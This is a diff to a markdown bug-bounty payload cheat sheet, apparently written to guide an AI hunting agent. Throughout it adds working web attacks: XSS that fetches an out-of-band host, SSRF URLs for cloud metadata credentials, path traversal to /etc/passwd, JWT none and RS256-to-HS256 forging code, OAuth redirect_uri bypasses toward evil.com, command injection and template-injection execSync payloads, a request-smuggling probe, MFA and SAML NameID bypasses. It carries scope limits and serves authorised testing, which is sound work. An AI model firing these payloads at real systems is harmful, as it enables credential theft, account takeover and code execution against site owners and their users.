@@ -22,12 +22,13 @@ Stop at draft. Never auto-submit. Claim only the row you proved.
 ## XSS PAYLOADS
 
 ### Basic Probes
+Context probes only. Reflection of `alert(1)` or the word `javascript` is **detection**, not XSS. Proof is a unique marker executing in the victim origin, or an OOB fetch that carries it.
 ```javascript
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(document.domain)>
 <svg onload=alert(document.domain)>
-"><script>alert(1)</script>
-'><img src=x onerror=alert(1)>
+"><img src=x onerror=fetch('https://UNIQUE.collab/'+document.domain)>
+'><img src=x onerror=alert(document.domain)>
 javascript:alert(document.domain)
 ```
 
@@ -95,9 +96,12 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 http://169.254.169.254/latest/user-data/
 
 # AWS IMDSv2 — GET without a token returns 401. That is reachability, not keys.
-# Only if the sink can set the method and a header:
+# Only if the sink can set the method AND a header:
 # PUT /latest/api/token  header X-aws-ec2-metadata-token-ttl-seconds: 21600
 # GET the paths above with header X-aws-ec2-metadata-token: <token from PUT>
+# Hop-limit 1 (AWS default on many 2024+ AMIs) drops the PUT from an extra proxy hop.
+# A 401/"IMDSv2 required" is still a hit — try GCP/Azure headers, IPv6 fd00:ec2::254,
+# or a client that forwards custom headers. Do not call it a miss.
 
 # GCP — header Metadata-Flavor: Google is required or the body is a rejection
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
@@ -109,6 +113,9 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 http://100.100.100.100/latest/meta-data/                          # Alibaba
 http://169.254.169.254/opc/v2/instance/                           # Oracle, header Authorization: Bearer Oracle
 http://169.254.169.254/metadata/v1/                               # DigitalOcean
+http://[fd00:ec2::254]/latest/meta-data/                          # AWS IPv6 IMDS — a filter that only blocks 169.254.169.254 misses this
+http://0.0.0.0/                                                   # often the same listener as 127.0.0.1
+http://169.254.169.254/computeMetadata/v1/                        # GCP alternate; still needs Metadata-Flavor: Google
 ```
 
 ### Internal Service Fingerprinting
@@ -133,9 +140,13 @@ http://[::ffff:0x7f000001] # mixed hex IPv6
 
 # DNS rebinding: A→external, then resolves to internal after allowlist check
 
-# Redirect chain (Vercel pattern):
-# If filter only checks initial URL but follows redirects:
+# Redirect chain (filter checks the first URL, client follows):
 http://allowed-domain.com/redirect?to=http://169.254.169.254/
+
+# DNS names that resolve to loopback (when IP literals are blocked)
+http://127.0.0.1.nip.io/
+http://localtest.me/
+http://localhost.localdomain/
 ```
 
 ---
@@ -235,9 +246,12 @@ Newlines and `&` in raw `/etc/passwd` break a URL — the PHP base64 filter avoi
 ..%2F..%2F..%2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 ..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
-/etc/passwd%00.jpg                     # null byte truncation
 ....\/....\/etc/passwd                 # mix of separators
+/static../etc/passwd                   # nginx alias / off-by-slash when the location has no trailing slash
+/static/..;/..;/WEB-INF/web.xml        # Tomcat path parameter; the filter and the servlet normalize ";" differently
+..\..\windows\win.ini                  # Windows
 ```
+`%00` truncation is historical (PHP before 5.3.4, old Java connectors). A modern 200 is not a file read unless the body is the file.
 
 ---
 
@@ -283,14 +297,23 @@ POST /api/user/update
 
 ### JWT Attacks
 ```bash
-# None algorithm
-# Decode JWT, change alg to "none", remove signature
+# None algorithm — base64url, not standard base64. Compact JSON (no spaces).
 import base64, json
-header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
-payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
-token = f"{header}.{payload}."
+def b64url(obj):
+    raw = json.dumps(obj, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
+token = f"{b64url({'alg':'none','typ':'JWT'})}.{b64url({'sub':'1','role':'admin'})}."
 
 # Do not crack HMAC secrets. No hashcat, no rockyou, no wordlist against the key.
+
+# RS256 → HS256: one forge using the PUBLIC key you already downloaded (JWKS / PEM).
+# If the API rejects it, stop. Do not wordlist.
+import hmac, hashlib
+pem = open("pub.pem","rb").read()   # or DER bytes from JWKS n,e
+h = b64url({"alg":"HS256","typ":"JWT"})
+p = b64url({"sub":"OTHER_TEST_USER","role":"admin"})
+sig = base64.urlsafe_b64encode(hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest()).decode().rstrip("=")
+token = f"{h}.{p}.{sig}"
 ```
 
 Algorithm confusion and header injection are single tests, not keyspace searches:
@@ -300,14 +323,21 @@ Algorithm confusion and header injection are single tests, not keyspace searches
 - `kid` path traversal or SQL only under `hunt-lfi` / `hunt-sqli` rules, and only when the file or the query result is in the response.
 
 ### OAuth Attacks
+Proof is the **code or token in your hands** (browser land + OOB), not a 302 the server emitted. Full matrix: `hunt-oauth`.
 ```bash
-# Missing PKCE test
+# PKCE skip — omit code_challenge; 302 without error means PKCE is not enforced
 GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
-# No code_challenge → check if 302 (not error) = PKCE not enforced
 
-# State parameter check
-GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
-# Missing/static state parameter = CSRF on OAuth = account linkage attack
+# State missing/static = CSRF on the callback (account-link). Prove B is linked to A's IdP.
+
+# redirect_uri — try each ONCE; confirm in a browser (WHATWG host vs string match)
+# https://evil.com#legit.com
+# https://legit.com.evil.com
+# https://legit.com@evil.com          # only if @ still in authority
+# https://legit.com%2eevil.com
+# https://legit.com/cb/../../../evil
+# https://legit.com/cb?next=https://evil.com
+# ?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb
 ```
 
 ---
@@ -352,6 +382,7 @@ curl -s -X POST https://target.com/api/login \
 ## COMMAND INJECTION PAYLOADS
 
 ### Basic Detection
+`sleep` / `ping` is a lead. Confirm with n≥10 interleaved 2s-vs-0s trials, or one OOB hostname. One delayed response is jitter.
 ```bash
 ; id
 | id
@@ -359,10 +390,10 @@ curl -s -X POST https://target.com/api/login \
 $(id)
 && id
 || id
-; sleep 5
-| sleep 5
-$(sleep 5)
-`sleep 5`
+; sleep 2
+| sleep 2
+$(sleep 2)
+`sleep 2`
 ```
 
 ### Blind OOB (out-of-band confirmation)
@@ -418,7 +449,7 @@ test`id`.jpg
 ${7*7}         → 49 = Freemarker (Java) or Spring EL
 <%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
 #{7*7}         → 49 = Mako (Python) or Pebble (Java)
-*{7*7}         → 49 = Spring Thymeleaf
+[[${7*7}]]     → 49 = Thymeleaf inline. *{7*7} is a selection expression and usually does not evaluate in a text sink.
 {{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
 ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ```
@@ -461,7 +492,9 @@ __${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.co
 **EJS (Node.js):**
 ```javascript
 <%= process.mainModule.require('child_process').execSync('id') %>
+<%= global.process.getBuiltinModule('child_process').execSync('id') %>
 ```
+`process.mainModule` is null under ESM and some current Node builds. `getBuiltinModule` is the fallback on Node 20.16+ / 22+. One `uid=` line, then stop.
 
 ### Where to Test
 ```
@@ -474,31 +507,24 @@ HTTP headers that appear in rendered responses, notification templates
 
 ## HTTP SMUGGLING PAYLOADS
 
-### CL.TE — Content-Length front-end, Transfer-Encoding back-end
+### Desync probe (timing lead — not a confirmation)
+
+`Content-Length: 13` plus `0\r\n\r\nSMUGGLED`, and a chunk size of `8` around the word `SMUGGLED`, mis-count the bytes and fail on current proxies. Use the timing shape. Do not poison a shared cache.
+
+CL.TE timing body (front-end uses Content-Length, back-end uses Transfer-Encoding). The bytes are `1\r\nA\r\nX`. The front-end forwards the first 4 (`1\r\nA`). A TE back-end waits.
+
 ```http
 POST / HTTP/1.1
 Host: target.com
-Content-Length: 13
+Content-Length: 4
 Transfer-Encoding: chunked
 
-0
-
-SMUGGLED
+1
+A
+X
 ```
 
-### TE.CL — Transfer-Encoding front-end, Content-Length back-end
-```http
-POST / HTTP/1.1
-Host: target.com
-Transfer-Encoding: chunked
-Content-Length: 3
-
-8
-SMUGGLED
-0
-
-
-```
+A timeout is a lead only when a normal POST and a finished chunk (`0\r\n\r\n`) are fast, on ≥3 interleaved tries. Confirmation is a **second** request on that connection whose response is for a path you hid (`/smug-UNIQ`). Obfuscated TE, duplicate CL, H2.CL, and CL.0 are in `hunt-http-smuggling`. One confirmed split, then stop.
 
 ### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
 ```http
@@ -526,12 +552,9 @@ Transfer-Encoding
 ### Detection
 A timeout is a lead only if a normal POST and a finished chunked body (`0\r\n\r\n`) are fast, and the probe is slow on ≥3 interleaved tries. CL.TE timing body is `Content-Length: 4` plus bytes `1\r\nA\r\nX` (front-end forwards `1\r\nA`; a TE back-end waits). Confirmation is a **second** request on that connection whose response is for a path you hid in the prefix (`/smug-UNIQ`), not a hang of the POST you failed to finish. Classic CL+TE returns 400 on strict front-ends — try obfuscated TE, duplicate CL, H2.CL/H2.TE, and CL.0 before leaving the host (`hunt-http-smuggling`). Do not poison a shared cache or another user's request.
 
-### Impact Chain
-```
-Basic desync          → Capture victim's next request → Read their auth token
-+ Admin user traffic  → Access admin as victim
-+ Cache poisoning     → Stored XSS at scale for all users
-```
+### Impact chain
+
+Prove the split on a request you send (the hidden path comes back to you). Do not desync another user's request and do not poison a shared cache. Token theft is a higher hop only if you actually captured a test account's token.
 
 ---
 
@@ -606,6 +629,13 @@ Also try: change status code 401 → 200, or change redirect from /failed to /da
 ### Pattern 4: Code you already have
 If a leak already gave you the seed, submit **one** current code to prove it. You may retry the single previous timestep for clock skew. Do not loop a window, and do not brute backup codes. No seed → skip this pattern.
 
+### Pattern 5: OTP leaked in response / not bound to account or session
+Logic bugs, no guessing:
+1. **OTP in the response body.** Request a code, then read the FULL API response (and any `debug`/`data` fields, headers, or the WebSocket/push channel) — some backends return the OTP they just mailed (`{"otp":"483920"}`). If the code is in the response, MFA is bypassed with zero keyspace work.
+2. **Cross-account binding.** Request a code for test account A, submit A's code against test account B's pending verification. Accepted = code not bound to the account.
+3. **Cross-session binding.** Request the code in browser 1, submit it in browser 2 / a fresh session. Accepted = code not bound to the requesting session/device.
+Proof: one login as the second test account using only data the server handed you. Then stop.
+
 ### Pattern 6: Skip MFA Step (Workflow Bypass)
 ```bash
 # After entering username/password, you get a session cookie
@@ -660,14 +690,10 @@ asyncio.run(race())
 </saml:Response>
 ```
 
-### Attack 2: Comment Injection in NameID
+### Attack 2: Comment injection in NameID
+Exclusive C14N drops comments. Some SPs then concatenate every text node; others keep only the first. The signed string and the identity the session is issued for have to differ. Prove it only if you land as an account you did not authenticate as.
 ```xml
-<!-- Original: user@company.com -->
-<!-- Injected:  -->
-<NameID>admin<!---->@company.com</NameID>
-<!-- XML parsers strip comments: admin@company.com -->
-<!-- SAML validator sees "user@company.com" (before comment) -->
-<!-- Application uses "admin@company.com" (after comment stripped) -->
+<NameID>user@legit.com<!---->.attacker.com</NameID>
 ```
 
 ### Attack 3: Signature Stripping
@@ -745,14 +771,11 @@ OAuth client_secret in mobile app (disclosed, expected)
 SSRF with DNS callback only (no internal service access)
 Host header injection alone (no password reset poisoning PoC)
 Rate limit on non-critical forms (login page Cloudflare, search, contact)
-Session not invalidated on logout
-Concurrent sessions allowed
 Internal IP address in error message
 Mixed content (HTTP resources on HTTPS page)
 SSL weak cipher suites
 Missing HttpOnly / Secure cookie flags alone
 Broken external links
-Pre-account takeover (usually — requires very specific conditions)
 Autocomplete on password fields
 Brute force / credential stuffing / password spraying / hash cracking (including OTP and JWT secrets)
 DoS: entity bombs, ReDoS, cache-poison loops, crash PoCs, FLUSHALL
@@ -777,6 +800,9 @@ These are valid ONLY when combined with a chain that proves real impact:
 | Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
 | S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
 | Self-XSS | + CSRF to trigger it on victim | Medium |
+| Session survives logout | Body-diff: the old cookie still returns identity on a later request | Medium–High |
+| Concurrent sessions | Password change or "logout all" leaves the sibling session live | High when it multiplies ATO |
+| Pre-account takeover | You hold the victim email path and receive their signup | High |
 | Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
 | GraphQL introspection | + auth bypass mutation or IDOR on node() | High |
 
